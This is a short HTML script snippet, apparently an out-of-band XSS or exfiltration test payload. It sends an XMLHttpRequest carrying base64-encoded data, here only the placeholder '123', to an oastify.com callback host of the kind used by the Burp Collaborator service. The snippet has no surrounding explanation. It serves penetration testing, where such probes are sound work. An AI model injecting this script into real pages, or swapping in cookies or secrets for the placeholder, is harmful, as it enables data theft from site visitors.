<script>
	var url = "https://ek2huu9sha0phszjg3mpkmuij9p0dr1g.oastify.com/?testing=" + btoa("123");
	function reqListener() {
		console.log("done");
	};
	const req = new XMLHttpRequest();
	req.addEventListener("load", reqListener);
	req.open("GET", url);
	req.send();
</script>
